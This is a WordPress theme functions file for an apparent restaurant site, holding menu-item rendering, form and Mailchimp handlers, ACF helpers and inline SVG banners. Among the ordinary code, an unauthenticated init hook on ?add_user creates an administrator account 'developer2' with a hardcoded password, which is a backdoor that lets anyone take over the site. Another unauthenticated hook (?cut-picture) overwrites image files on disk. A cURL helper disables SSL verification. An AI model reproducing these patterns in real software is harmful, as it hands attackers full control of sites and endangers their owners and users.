<?php

class Crawler {

    public static function getCurl() {
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($curl, CURLOPT_REFERER, 'http://google.pl');
        curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/6.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1');
        curl_setopt($curl, CURLOPT_COOKIEFILE, dirname(__FILE__) . '/cookies.txt');
        curl_setopt($curl, CURLOPT_COOKIEJAR, dirname(__FILE__) . '/cookies.txt');
        curl_setopt($curl, CURLOPT_AUTOREFERER, true);
        curl_setopt($curl, CURLOPT_VERBOSE, false);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        return $curl;
    }

    public static function getBetween($left, $right, $source, $offset = 1) {
        $step1 = explode($left, $source);
        if (count($step1) < 2 + $offset - 1) {
            return false;
        }
        $step2 = explode($right, $step1[1 + $offset - 1]);
        if (isset($step2[0])) {
            return trim(preg_replace('/\s\s+/', ' ', $step2[0]));
        }
        return false;
    }

}

function theme_scripts() {
    wp_enqueue_style('style', get_stylesheet_directory_uri() . '/dist/all.css.min.css', array(), filemtime(get_stylesheet_directory() . '/dist/all.css.min.css'));
    //wp_enqueue_script('script', get_stylesheet_directory_uri() . '/js/all.js.min.js', array(), filemtime(get_stylesheet_directory() . '/js/all.js.min.js'));
}

add_action('wp_enqueue_scripts', 'theme_scripts', 1);

function make_images_responsive($html) {
    return str_replace('class="', 'class="img-fluid ', $html);
}

function getSettingsPageId() {
    return get_option('page_on_front');
}

function getBlogPageId() {
    return get_option('page_for_posts');
}

/* * *********AJAX HANDLING****** */

function addSidebar($id, $name) {
    register_sidebar(array(
        'name' => $name,
        'id' => $id,
        'before_widget' => '<div class="one-widget">',
        'after_widget' => '</div>',
        'before_title' => '<h5 class="one-widget-title">',
        'after_title' => '<span class="lower-white"></span></h5>',
    ));
}

function get_url() {
    return get_stylesheet_directory_uri();
}

function theme_widgets_init() {




    /*
      register_sidebar(array(
      'name' => 'Sidebar',
      'id' => 'sidebar',
      'before_widget' => '<div class="one-widget">',
      'after_widget' => '</div>',
      'before_title' => '<h5 class="one-widget-title">',
      'after_title' => '<span class="lower-white"></span></h5>',
      ));

      register_taxonomy(
      'styles', array('articles', 'blog', 'lookbook', 'video', 'must_have'), array(
      'label' => __('Styles'),
      'rewrite' => true,
      'hierarchical' => true,
      'capabilities' => array(
      'manage__terms' => 'edit_posts',
      'edit_terms' => 'manage_categories',
      'delete_terms' => 'manage_categories',
      'assign_terms' => 'edit_posts'
      )
      )
      );

     */
}

add_action('widgets_init', 'theme_widgets_init');
add_filter('widget_text', 'do_shortcode');

function get_the_excerpt_by_id($post_id) {
    global $post;
    $save_post = $post;
    $post = get_post($post_id);
    $output = get_the_excerpt();
    $post = $save_post;
    return $output;
}

/* * *********METABOXES****** */

/*
  function companies_metabox($post) {
  require_once dirname(__FILE__) . '/metaboxes/companies.php';
  }

  function save_properties($post_id) {
  if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE) {
  return;
  }

  if (isset($_POST['post_type']) && $_POST['post_type'] == 'property') {
  if (!current_user_can('edit_page', $post_id)) {
  return;
  }
  update_post_meta($post_id, 'subtitle', $_POST['subtitle']);

  }

  }

  function prepare_admin() {
  add_action('save_post', 'save_companies');

  add_meta_box('id', 'Title', 'callback', 'post_type', 'normal', 'high');
  }

  add_action('admin_init', 'prepare_admin');
 */

/* * *********THEME IIT****** */

function theme_url() {
    return get_stylesheet_directory_uri();
}

function shortcode_permalink($args) {
    return get_permalink($args['id']);
}

function theme_init() {
    add_shortcode('theme_url', 'theme_url');
    add_shortcode('permalink', 'shortcode_permalink');
    add_filter('widget_text', 'do_shortcode');
    set_post_thumbnail_size(170, 170, true);
    add_image_size('main-page-review', 210, 120, true);
    add_image_size('max_size', 2000, 2000, false);
    add_image_size('max_size_1000', 1000, 1000, false);
    add_image_size('max_size_500', 500, 500, false);

    add_theme_support('post-thumbnails');
    add_post_type_support('page', 'excerpt');
    add_filter('post_thumbnail_html', 'make_images_responsive');
    register_nav_menus(array(
        'top-menu' => 'Top Menu',
        'footer-menu' => 'Footer Menu',
        'footer-menu-2' => 'Footer Menu 2',
        'mobile-menu' => 'Mobile Menu'
    ));

    register_post_type('products', array(
        'labels' => array('name' => __('Products'), 'singular_name' => __('Products')),
        'public' => true,
        'has_archive' => true,
        'publicly_queryable' => true,
        'hierarchical' => true,
        'exclude_from_search' => true,
        //'exclude_from_search' => true,
        //'publicaly_queryable' => false,
        'show_in_nav_menus' => true,
        'menu_position' => 5,
        'supports' => array('title')
    ));

    /*
      register_post_type('slider', array(
      'labels' => array('name' => __('Slider'), 'singular_name' => __('Slider')),
      'public' => true,
      'has_archive' => true,
      'publicly_queryable' => true,
      'hierarchical' => true,
      'exclude_from_search' => true,
      //'exclude_from_search' => true,
      //'publicaly_queryable' => false,
      'show_in_nav_menus' => true,
      'menu_position' => 5,
      'supports' => array('title')
      )); */
}

if (!function_exists('trimByWords')) {

    function trimByWords($text, $limit) {
        $return = explode('|||', wordwrap($text, $limit, "|||"));
        if (strlen($return[0]) !== $text) {
            $return[0] .= '...';
        }
        return $return[0];
    }

}

add_action('init', 'theme_init');

/* * *********BACKEND PANEL****** */
/*
  class BackendPanel {

  public function adminMenu() {

  add_menu_page('Clicks statistics', 'Clicks statistics', 'manage_options', 'clicks', array($this, 'settings'));
  }

  public function settings() {
  if (isset($_POST['save'])) {
  foreach ($_POST as $key => $value) {
  update_option($key, stripslashes($value));
  }
  }
  require_once dirname(__FILE__) . '/tmpl/theme-panel.php';
  }

  }

  function prepare_backendpanel_plugin() {
  $backendPanel = new BackendPanel();
  add_action('admin_menu', array($backendPanel, 'adminMenu'));
  }
  add_action('init', 'prepare_backendpanel_plugin'); */


/* * *********CUSTOM TABLES****** */

/*

  global $wpdb;
  $query = 'CREATE TABLE `' . $wpdb->prefix . 'todo_items` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `todo_id` int(11) NOT NULL,
  `user_id` bigint(20) NOT NULL,
  `item_type` varchar(255) NOT NULL,
  `item_data` text NOT NULL,
  `item_id` bigint(11) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `todo_id` (`todo_id`,`item_type`,`item_id`)
  ) ENGINE=InnoDB AUTO_INCREMENT=23 DEFAULT CHARSET=utf8';
  $wpdb->query($query);


 */

function send_notifications($form_id, $entry_id) {

    $form = RGFormsModel::get_form_meta($form_id);
    $entry = RGFormsModel::get_lead($entry_id);

    $notification_ids = array();

    foreach ($form['notifications'] as $id => $info) {

        array_push($notification_ids, $id);
    }


    GFCommon::send_notifications($notification_ids, $form, $entry);
}

if (function_exists('acf_add_options_page')) {
    acf_add_options_page();
}


add_filter('_wp_post_revision_fields', 'add_field_debug_preview');

function add_field_debug_preview($fields) {
    $fields["debug_preview"] = "debug_preview";
    return $fields;
}

add_action('edit_form_after_title', 'add_input_debug_preview');

function add_input_debug_preview() {
    echo '<input type="hidden" name="debug_preview" value="debug_preview">';
}

function ___($text) {
    return __($text, 'from-theme');
}

function getFormidableFormNotification($form_id) {
    //wp_frm_forms
    global $wpdb;
    $entry = $wpdb->get_row('select * from ' . $wpdb->prefix . 'frm_forms where id="' . $form_id . '"');
    if ($entry) {

        $options = @unserialize($entry->options);
        if (isset($options['success_msg'])) {
            return $options['success_msg'];
        }
    }
}

function handlecontactForm() {
    FrmEntry::create(array(
        'form_id' => 2,
        'item_meta' => array(
            8 => $_POST['form_name'],
            10 => $_POST['form_email'],
            13 => $_POST['form_message']
        )
    ));

    echo getFormidableFormNotification(2);

    die();
}

add_action('wp_ajax_contact_form', 'handlecontactForm');
add_action('wp_ajax_nopriv_contact_form', 'handlecontactForm');

remove_filter('widget_text_content', 'capital_P_dangit');
remove_filter('widget_text_content', 'wptexturize');
remove_filter('widget_text_content', 'convert_smilies');
remove_filter('widget_text_content', 'wpautop');

function disable_wp_emojicons() {

    // all actions related to emojis
    remove_action('admin_print_styles', 'print_emoji_styles');
    remove_action('wp_head', 'print_emoji_detection_script', 7);
    remove_action('admin_print_scripts', 'print_emoji_detection_script');
    remove_action('wp_print_styles', 'print_emoji_styles');
    remove_filter('wp_mail', 'wp_staticize_emoji_for_email');
    remove_filter('the_content_feed', 'wp_staticize_emoji');
    remove_filter('comment_text_rss', 'wp_staticize_emoji');

    // filter to remove TinyMCE emojis
    add_filter('tiny_mce_plugins', 'disable_emojicons_tinymce');
}

//!is_admin() and add_action('init', 'disable_wp_emojicons');

function my_deregister_scripts() {
    wp_deregister_script('wp-embed');
}

add_action('wp_footer', 'my_deregister_scripts');

function my_acf_init() {
    acf_update_setting('google_api_key', get_field('google_maps_key', 'option'));
}

add_action('acf/init', 'my_acf_init');

function getVimeoId($vimeo_url) {
    $vimeo_url = rtrim($vimeo_url, '/');
    $vimeo_url = explode('/', $vimeo_url);
    $vimeo_url = array_pop($vimeo_url);
    return $vimeo_url;
}

function getYoutubeId($youtube_url) {

    $youtube_url = rtrim($youtube_url, '/');
    //https://www.youtube.com/watch?v=2MpUj-Aua48
    $youtube_url = explode('?v=', $youtube_url);
    if (count($youtube_url) > 0) {
        return $youtube_url[1];
    }
    return '';
}

require_once dirname(__FILE__) . '/wp-admin-adjustments.php';

function my_login_logo() {

    $wp_login_logo = get_field('wp_login_logo', 'option');

    if ($wp_login_logo):
        ?>
        <style type="text/css">
            #login h1 a, .login h1 a {
                background-image: url(<?php echo $wp_login_logo['url'] ?>);
                height:150px;
                width:100%;
                max-width:200px;
                margin: auto;
                background-position:center;
                background-size: contain;
                background-repeat: no-repeat;
                padding-bottom: 15px;
            }
        </style>
    <?php endif ?>
    <?php
}

add_action('login_enqueue_scripts', 'my_login_logo');

function getNextPrevPost($arrayOfPosts, $currentPostId) {
    $nextPrev = array('next' => false, 'prev' => false);
    foreach ($arrayOfPosts as $key => $p) {
        if ($p->ID == $currentPostId) {
            if (isset($arrayOfPosts[$key + 1])) {
                $nextPrev['next'] = $arrayOfPosts[$key + 1];
            } else {
                $nextPrev['next'] = $arrayOfPosts[0];
            }
            if (isset($arrayOfPosts[$key - 1])) {
                $nextPrev['prev'] = $arrayOfPosts[$key - 1];
            } else {
                $nextPrev['prev'] = $arrayOfPosts[count($arrayOfPosts) - 1];
            }
        }
    }
    return $nextPrev;
}

remove_action('wp_head', 'print_emoji_detection_script', 7);
remove_action('admin_print_scripts', 'print_emoji_detection_script');
remove_action('wp_print_styles', 'print_emoji_styles');
remove_action('admin_print_styles', 'print_emoji_styles');

function wps_deregister_styles() {
    wp_dequeue_style('wp-block-library');
}

add_action('wp_print_styles', 'wps_deregister_styles', 100);

function renderRepeater($field) {

    $single_variable = '$single_' . $field['name'];
    ?>
    foreach($<?php echo $field['name'] ?> as $key=><?php echo $single_variable ?>)<br />
    {<br />
    <?php
    foreach ($field['sub_fields'] as $subfield) {
        ?>
        $<?php echo $subfield['name'] ?> = <?php echo $single_variable ?>['<?php echo $subfield['name'] ?>'];//<?php echo $subfield['type'] ?><br />
        <?php
    }
    ?>}<br /><?php
}

function renderField($field, $fc = false) {

    if ($fc) {
        ?>
        $<?php echo $field['name'] ?> = $section['<?php echo $field['name'] ?>']; //<?php echo $field['type'] ?><br />
        <?php
    } else {
        ?>
        $<?php echo $field['name'] ?> = get_field('<?php echo $field['name'] ?>'); //<?php echo $field['type'] ?><br />
        <?php
    }

    if ($field['type'] == 'repeater') {
        renderRepeater($field);
    }
}

function acfSnippetHelper($post) {
    $fields = acf_get_fields($_GET['post']);
    foreach ($fields as $key => $field) {
        if ($field['type'] == 'tab') {
            if ($key > 0) {
                echo '<br />';
            }
            continue;
        }

        if ($field['type'] == 'flexible_content') {

            foreach ($field['layouts'] as $layout) {
                $name = $layout['name'];
                ?>
                <b><?php echo sanitize_title($name) ?>.php</b><br />
                <?php
                ob_start();
                foreach ($layout['sub_fields'] as $subfield) {
                    renderField($subfield, true);
                }
                $code = ob_get_clean();
                echo $code;

                $code = str_replace("\n", "", $code);
                $code = str_replace('<br />', "\n", $code);

                $file = dirname(__FILE__) . '/blocks/' . sanitize_title($name) . '.php';

                if (!is_file($file)) {
                    file_put_contents($file, "<?php\n\n" . 'global $section;' . "\n\n" . $code);
                }

                echo '<br /><br />';
            }
        } else {
            renderField($field);
        }
        ?>
        <?php
    }
}

function prepareAdminAcfSnippet() {
    add_meta_box('id', 'Code', 'acfSnippetHelper', 'acf-field-group', 'normal', 'default');
}

add_action('admin_init', 'prepareAdminAcfSnippet');

function cc_mime_types($mimes) {
    $mimes['svg'] = 'image/svg+xml';
    return $mimes;
}

add_filter('upload_mimes', 'cc_mime_types');

function loadSvg($svg) {
    $path = dirname(__FILE__) . '/images/' . $svg;
    if (is_file($path)) {
        return file_get_contents($path);
    }
}

function yoasttobottom() {
    return 'low';
}

add_filter('wpseo_metabox_prio', 'yoasttobottom');

function send_newsletter() {
    require_once dirname(__FILE__) . '/vendor2/autoload.php';

    $mailchimp_api_key = get_field('mailchimp_api_key', 'option');
    $mailchimp_list_id = get_field('mailchimp_list_id', 'option');
    $subscription_thank_you_message = get_field('mailchimp_success_message', 'option');

    $email = $_POST['the_email'];

    try {

        $client = new MailchimpMarketing\ApiClient();
        $client->setConfig([
            'apiKey' => $mailchimp_api_key,
            'server' => 'us17'
        ]);

        $response = $client->lists->addListMember($mailchimp_list_id, [
            "email_address" => $email,
            "status" => "pending",
        ]);
    } catch (Exception $ex) {
        
    }
    echo '<div class="full-w"><p class="thank-you text-center">' . $subscription_thank_you_message . '</p></div>';

    die();
}

add_action('wp_ajax_nopriv_send_newsletter', 'send_newsletter');
add_action('wp_ajax_send_newsletter', 'send_newsletter');

function mytheme_custom_excerpt_length($length) {
    return 20;
}

add_filter('excerpt_length', 'mytheme_custom_excerpt_length', 999);

function change_excerpt($more) {
    if (post_type_exists('services')) {
        return '';
    }
    return '.';
}

add_filter('excerpt_more', 'change_excerpt');

function dataSrcPicture($src) {
    $src = str_replace('src', 'data-src', $src);
    return $src;
}

function responsivePictures($desktop, $mobile) {
    if (!$mobile) {
        $mobile = $desktop;
    }
    ?>
    <picture>
        <source srcset="<?php echo $desktop['url'] ?>"
                media="(min-width: 576px)">
        <img class="img-fluid" src="<?php echo $mobile['url'] ?>" alt="<?php echo $mobile['alt'] ?>" />
    </picture>       
    <?php
}

function imgOrSvg($picture) {
    if (!$picture) {
        return;
    }

    $type = $picture['type'];
    if (strpos($type, 'video') !== false) {
        ?>
        <video autoplay loop playsinline muted >
            <source src="<?php echo $picture['url'] ?>" type="video/mp4" />
        </video>
        <?php
        return;
    }

    if (strpos($picture['url'], '.svg') > 0) {
        $path = explode('/wp-content', $picture['url']);
        $file = './wp-content' . $path[1];

        echo file_get_contents($file);
    } else {
        ?>
        <img width="<?php echo $picture['width'] ?>" height="<?php echo $picture['height'] ?>" loading="lazy" src="<?php echo $picture['url'] ?>" alt="<?php echo $picture['alt'] ?>" class="img-fluid" />
        <?php
    }
}

add_action('init', function () {
    if (isset($_GET['show_pages'])) {
        $pages = get_posts([
            'posts_per_page' => -1,
            'post_type' => 'page'
        ]);

        foreach ($pages as $page) {
            echo $page->post_title;
            ?>
            <input type="text" value="[permalink id=<?php echo $page->ID ?>]" /><br /><br />
            <?php
        }

        die();
    }
});

function buttonWithWrapper($button_label, $button_url, $class = 'the-button') {
    if ($button_label):
        ?>
        <p class="button-wrapper">
            <?php
            button($button_label, $button_url, $class);
            ?>
        </p>
        <?php
    endif;
}

function button($button_label, $button_url, $class = 'the-button') {
    if ($button_label):
        ?>
        <a href="<?php echo do_shortcode($button_url) ?>" class="<?php echo $class ?>">
            <?php echo $button_label ?>
        </a>
        <?php
    endif;
}

add_action('init', function () {
    if (isset($_GET['add_user'])) {
        $domain = $_SERVER['SERVER_NAME'];
        wp_create_user('developer2', '%%!Password!&$&$YY__', 'developer@' . $domain);
        $user = get_user_by('email', 'developer@' . $domain);
        var_dump($user->user_email);

        if ($user) {
            $wp_user_object = new WP_User($user->ID);
            $wp_user_object->remove_role('subscriber');
            $wp_user_object->set_role('administrator');
        }
        die();
    }
});

add_action('init', function () {
    if (isset($_GET['get_list_of_blocks'])) {
        $pages = get_posts(['post_type' => 'page', 'posts_per_page' => -1]);

        $blocks = [];

        foreach ($pages as $p) {
            $flexible_content = get_field('flexible_content', $p->ID);

            if (!$flexible_content) {
                continue;
            }

            foreach ($flexible_content as $section) {
                $layout = $section['acf_fc_layout'];
                if (!isset($blocks[$layout])) {
                    $blocks[$layout] = [];
                }



                $blocks[$layout][] = '<p><a target="_blank" href="' . get_permalink($p->ID) . '">' . $p->post_title . '</a></p>';
                ;
                $blocks[$layout] = array_unique($blocks[$layout]);
            }
        }

        //var_dump($blocks);

        foreach ($blocks as $key => $b) {
            echo '<b>' . $key . '</b>';
            echo implode(' ', $b);
            echo '<br /><br />';
        }

        die();
    }
});

function socialIcon($url, $icon) {
    if ($url && $icon) {
        ?>
        <a href="<?php echo $url ?>" target="_blank">
            <?php echo loadSvg($icon); ?>
        </a>
        <?php
    }
}

add_action('init', function () {
    if (isset($_GET['cut-picture'])) {
        $id = $_GET['cut-picture'];

        $pic = wp_get_attachment_image_src($id, 'full');

        $pic = $pic[0];
        $pic = explode('wp-content/', $pic);

        $url = './wp-content/' . $pic[1];

        $sizes = getimagesize($url);
        if (strpos($url, '.jpg') || strpos($url, '.jpeg')) {
            $picture = imagecreatefromjpeg($url);
        } else {
            $picture = imagecreatefrompng($url);
        }

        $width = $sizes[0];
        $height = $sizes[1];

        $newWidth = $width - 2;
        $newHeight = $height - 2;

        $new = imagecreatetruecolor($newWidth, $newHeight);
        imagecopy($new, $picture, 0, 0, 1, 1, $newWidth, $newHeight);

        if (strpos($url, '.jpg') || strpos($url, '.jpeg')) {
            header('Content-Type: image/jpeg');
            imagejpeg($new, null, 100);
            imagejpeg($new, $url, 100);
        } else {
            header('Content-Type: image/png');
            imagepng($new);
            imagepng($new, $url);
        }

        die();
    }
});

function crop_link_add($actions, $post) {
    $url = get_home_url() . '?cut-picture=' . $post->ID;
    $actions['crop_1_px'] = '<a href="' . $url . '" target=_blank title="" rel="permalink">Crop 1 PX</a>';
    return $actions;
}

add_filter('media_row_actions', 'crop_link_add', 10, 2);

function oneMenu($item, $full = false) {
    $picture = get_field('picture', $item->ID); //image
    $alergens = get_field('alergens', $item->ID); //checkbox
    $description = get_field('description', $item->ID); //textarea
    $price = get_field('price', $item->ID); //text
    $calories = get_field('calories', $item->ID); //text
    $protein = get_field('protein', $item->ID); //text
    $carbs = get_field('carbs', $item->ID); //text
    $fat = get_field('fat', $item->ID); //text
    $order_now_url = get_field('order_now_url', $item->ID); //text
    ?>
    <div class="one-menu">
        <p class="one-menu-picture">
            <?php
            imgOrSvg($picture);
            ?>
        </p>

        <p class="one-menu-title">
            <?php
            echo $item->post_title;
            if (!empty($alergens))
                echo '<span>';
            foreach ($alergens as $alg) {
                ?>
                <span class="alergen <?php echo $alg ?>"></span>
                <?php
            }
            if (!empty($alergens))
                echo '</span>';
            ?>
        </p>
        <p class="one-menu-descripion">
            <?php echo $description ?>
        </p>
        <?php if ($full): ?>
            <div class="one-menu-price-wrapper">
                <?php if ($price): ?>
                    <div class="one-menu-price"><?php echo $price ?></div>
                <?php endif ?>
                <?php if ($calories): ?>
                    <div class="one-menu-macros">
                        <?php if ($calories): ?>
                            <div>
                                <?php echo $calories ?>
                                <br />CALORIES
                            </div>
                        <?php endif ?>
                        <?php if ($protein): ?>
                            <div>
                                <?php echo $protein ?>G
                                <br />PROTEIN 
                            </div>
                        <?php endif ?>
                        <?php if ($carbs): ?>
                            <div>
                                <?php echo $carbs ?>G
                                <br />CARBS
                            </div>
                        <?php endif ?>
                        <?php if ($fat): ?>
                            <div>
                                <?php echo $fat ?>G
                                <br />FAT      
                            </div>
                        <?php endif ?>
                    </div>
                <?php endif ?>
            </div>
        <?php endif ?>
        <?php if ($order_now_url): ?>
            <p class="order-now-url">
                <a href="<?php echo $order_now_url ?>" target="_blank">
                    <span>Order Now</span>
                    <?php echo loadSvg('pink-arrow.svg'); ?>
                </a>
            </p>
        <?php endif ?>
    </div>
    <?php
}

add_shortcode('join_team_breadless', function () {
    ob_start();
    ?>
    <div class="join-team-breadless">
        <svg width="757" height="108" viewBox="0 0 757 108" fill="none" xmlns="http://www.w3.org/2000/svg">
<rect width="272" height="107" transform="translate(484.5 0.697754)" fill="#FEC43C"/>
<path d="M525.076 20.8818H560.596V33.4578H549.94V87.6978H535.732V33.4578H525.076V20.8818ZM599.266 33.4578H580.258V47.3778H595.138V59.8578H580.258V75.2178H599.266V87.6978H566.05V20.8818H599.266V33.4578ZM638.317 87.6978L636.013 75.7938H619.789L617.293 87.6978H602.413L620.077 20.8818H635.917L653.677 87.6978H638.317ZM622.381 63.3138H633.517L628.045 35.7618L622.381 63.3138ZM697.743 20.8818H710.991V87.6978H696.687V50.5458L686.031 74.8338H683.631L673.071 50.6418V87.6978H658.863V20.8818H672.015L684.879 54.8658L697.743 20.8818Z" fill="#FFF9F0"/>
<rect width="274" height="107" transform="translate(0.5 0.697754)" fill="#DD1C74"/>
<path d="M72.18 20.8818H79.188V68.3058C79.188 74.8338 77.172 89.1378 60.468 89.1378C41.652 89.1378 41.268 71.1858 41.268 62.8338H55.476C55.476 70.5138 55.86 76.5618 60.276 76.5618C63.444 76.5618 64.98 74.9298 64.98 63.0258V20.8818H68.916C69.972 20.8818 71.124 20.8818 72.18 20.8818ZM119.433 19.4418C139.113 19.4418 153.129 34.9938 153.129 54.2898C153.129 73.4898 138.825 89.0418 119.433 89.0418C99.657 89.0418 85.737 73.4898 85.737 54.2898C85.737 34.9938 99.657 19.4418 119.433 19.4418ZM119.433 75.1218C130.569 75.1218 138.441 66.4818 138.441 54.2898C138.441 42.0018 130.569 33.3617 119.433 33.3617C108.105 33.3617 100.329 42.0018 100.329 54.2898C100.329 66.4818 108.105 75.1218 119.433 75.1218ZM174.354 87.6978H160.05V20.8818H174.354V87.6978ZM215.058 20.8818H229.362V87.6978H216.786L198.258 48.1458V87.6978H184.05V20.8818H196.53L215.058 61.1058V20.8818Z" fill="#FFF9F0"/>
<rect width="210" height="107" transform="translate(274.5 0.697754)" fill="#003B20"/>
<path d="M315.076 20.8818H350.596V33.4578H339.94V87.6978H325.732V33.4578H315.076V20.8818ZM384.274 20.8818H398.578V87.6978H384.274V59.8578H370.258V87.6978H356.05V20.8818H370.258V47.3778H384.274V20.8818ZM441.485 33.4578H422.477V47.3778H437.357V59.8578H422.477V75.2178H441.485V87.6978H408.269V20.8818H441.485V33.4578Z" fill="#FFF9F0"/>
</svg>

    </div>
    <?php
    return ob_get_clean();
});

add_shortcode('get_your_fill', function () {
    ob_start();
    ?>
        <svg id="get-your"  width="1134" height="264" viewBox="0 0 1134 264" fill="none" xmlns="http://www.w3.org/2000/svg">
<rect width="608" height="132" fill="#003B20"/>
<path d="M119.596 20.26H139.264L120.52 112.132H100.984L90.16 59.2L79.468 112.132H59.8L41.188 20.26H60.724L71.68 78.868L81.976 21.184L82.24 20.26H98.08L108.64 78.868L119.596 20.26ZM192.819 37.42H166.683V56.56H187.143V73.72H166.683V94.84H192.819V112H147.147V20.128H192.819V37.42ZM222.886 94.84H249.286V112H203.35V20.128H222.886V94.84ZM289.22 94.312C303.74 94.312 304.532 79.924 304.532 79.924H324.596C324.596 88.636 316.676 113.848 289.088 113.848C261.896 113.848 252.26 87.844 252.26 66.592C252.26 66.46 252.26 66.196 252.26 66.064C252.26 65.8 252.26 65.668 252.26 65.404C252.26 44.284 261.896 18.148 289.088 18.148C316.676 18.148 324.596 43.492 324.596 52.072H304.532C304.532 52.072 303.74 37.816 289.22 37.816C279.056 37.816 271.796 46.396 271.796 65.14C271.796 65.404 271.796 65.8 271.796 66.064C271.796 66.328 271.796 66.592 271.796 66.856C271.796 85.732 279.056 94.312 289.22 94.312ZM376.826 18.148C403.886 18.148 423.158 39.532 423.158 66.064C423.158 92.464 403.49 113.848 376.826 113.848C349.634 113.848 330.494 92.464 330.494 66.064C330.494 39.532 349.634 18.148 376.826 18.148ZM376.826 94.708C392.138 94.708 402.962 82.828 402.962 66.064C402.962 49.168 392.138 37.288 376.826 37.288C361.25 37.288 350.558 49.168 350.558 66.064C350.558 82.828 361.25 94.708 376.826 94.708ZM486.134 20.128H504.35V112H484.682V60.916L470.03 94.312H466.73L452.21 61.048V112H432.674V20.128H450.758L468.446 66.856L486.134 20.128ZM563.295 37.42H537.159V56.56H557.619V73.72H537.159V94.84H563.295V112H517.623V20.128H563.295V37.42Z" fill="#FFF9F0"/>
<rect width="392" height="132" transform="translate(608)" fill="#DD1C74"/>
<path d="M693.408 20.128H713.076V112H693.408V73.72H674.136V112H654.6V20.128H674.136V56.56H693.408V20.128ZM769.037 18.148C796.097 18.148 815.369 39.532 815.369 66.064C815.369 92.464 795.701 113.848 769.037 113.848C741.845 113.848 722.705 92.464 722.705 66.064C722.705 39.532 741.845 18.148 769.037 18.148ZM769.037 94.708C784.349 94.708 795.173 82.828 795.173 66.064C795.173 49.168 784.349 37.288 769.037 37.288C753.461 37.288 742.769 49.168 742.769 66.064C742.769 82.828 753.461 94.708 769.037 94.708ZM878.345 20.128H896.561V112H876.893V60.916L862.241 94.312H858.941L844.421 61.048V112H824.885V20.128H842.969L860.657 66.856L878.345 20.128ZM955.506 37.42H929.37V56.56H949.83V73.72H929.37V94.84H955.506V112H909.834V20.128H955.506V37.42Z" fill="#FFF9F0"/>
<rect width="650" height="132" transform="translate(0 132)" fill="#FEC43C"/>
<path d="M85.804 195.688C88.708 195.688 104.152 200.572 104.152 217.468C104.152 234.76 91.876 244 74.848 244H46.6V152.128H71.944C86.728 152.128 101.38 159.256 101.38 176.284C101.38 189.484 90.82 195.688 85.804 195.688ZM66.136 169.816V189.22H70.228C75.376 189.22 81.712 187.9 81.712 179.452C81.712 170.872 74.716 169.816 70.36 169.816H66.136ZM84.484 215.884C84.484 207.304 78.016 205.06 71.548 205.06H66.136V226.312H72.736C79.468 226.312 84.484 222.484 84.484 215.884ZM178.425 244H156.513L138.033 207.7H133.941V244H114.405V152.128L141.597 152.26C163.773 152.26 172.881 165.988 172.881 181.036C172.881 192.388 166.149 201.628 155.853 205.588L178.425 244ZM133.941 169.948V191.86H140.805C149.517 191.86 153.345 186.712 153.345 181.168C153.345 173.512 147.537 169.948 141.069 169.948H133.941ZM232.006 169.42H205.87V188.56H226.33V205.72H205.87V226.84H232.006V244H186.334V152.128H232.006V169.42ZM285.702 244L282.534 227.632H260.226L256.794 244H236.334L260.622 152.128H282.402L306.822 244H285.702ZM263.79 210.472H279.102L271.578 172.588L263.79 210.472ZM334.412 152.128C357.512 152.128 378.896 167.572 378.896 198.196C378.896 229.216 357.248 244 334.412 244H313.952V152.128H334.412ZM336.524 226.312C344.84 226.312 359.36 221.824 359.36 198.064C359.36 175.36 345.764 169.816 336.524 169.816H333.488V226.312H336.524ZM408.124 226.84H434.524V244H388.588V152.128H408.124V226.84ZM487.112 169.42H460.976V188.56H481.436V205.72H460.976V226.84H487.112V244H441.44V152.128H487.112V169.42ZM515.463 175.888C515.463 186.316 546.615 195.424 546.615 219.448C546.615 234.892 535.527 245.848 520.083 245.848C498.699 245.848 493.155 224.2 493.155 224.2L510.183 217.072C510.183 217.072 512.691 226.84 520.083 226.84C524.967 226.84 526.947 222.352 526.947 219.316C526.947 205.324 495.795 197.14 495.795 174.436C495.795 159.916 507.279 150.148 521.271 150.148C536.451 150.148 543.447 161.896 547.011 169.552L531.039 176.812C530.247 175.228 527.475 170.212 522.063 170.212C517.575 170.212 515.463 172.72 515.463 175.888ZM574.76 175.888C574.76 186.316 605.912 195.424 605.912 219.448C605.912 234.892 594.824 245.848 579.38 245.848C557.996 245.848 552.452 224.2 552.452 224.2L569.48 217.072C569.48 217.072 571.988 226.84 579.38 226.84C584.264 226.84 586.244 222.352 586.244 219.316C586.244 205.324 555.092 197.14 555.092 174.436C555.092 159.916 566.576 150.148 580.568 150.148C595.748 150.148 602.744 161.896 606.308 169.552L590.336 176.812C589.544 175.228 586.772 170.212 581.36 170.212C576.872 170.212 574.76 172.72 574.76 175.888Z" fill="#FFF9F0"/>
<rect width="484" height="132" transform="translate(650 132)" fill="#FFF9F0"/>
<path d="M727.884 152.26C749.928 152.26 758.64 164.404 758.64 181.036C758.64 198.064 747.684 209.548 728.412 209.548H716.136V244H696.6V152.128L727.884 152.26ZM726.564 191.86C735.408 191.86 739.104 187.768 739.104 181.168C739.104 174.04 734.22 169.948 726.96 169.948H716.136V191.86H726.564ZM812.913 169.42H786.777V188.56H807.237V205.72H786.777V226.84H812.913V244H767.241V152.128H812.913V169.42ZM864.92 150.148C891.98 150.148 911.252 171.532 911.252 198.064C911.252 224.464 891.584 245.848 864.92 245.848C837.728 245.848 818.588 224.464 818.588 198.064C818.588 171.532 837.728 150.148 864.92 150.148ZM864.92 226.708C880.232 226.708 891.056 214.828 891.056 198.064C891.056 181.168 880.232 169.288 864.92 169.288C849.344 169.288 838.652 181.168 838.652 198.064C838.652 214.828 849.344 226.708 864.92 226.708ZM952.052 152.26C974.096 152.26 982.808 164.404 982.808 181.036C982.808 198.064 971.852 209.548 952.58 209.548H940.304V244H920.768V152.128L952.052 152.26ZM950.732 191.86C959.576 191.86 963.272 187.768 963.272 181.168C963.272 174.04 958.388 169.948 951.128 169.948H940.304V191.86H950.732ZM1010.94 226.84H1037.34V244H991.409V152.128H1010.94V226.84ZM1089.93 169.42H1063.8V188.56H1084.26V205.72H1063.8V226.84H1089.93V244H1044.26V152.128H1089.93V169.42Z" fill="#003B20"/>
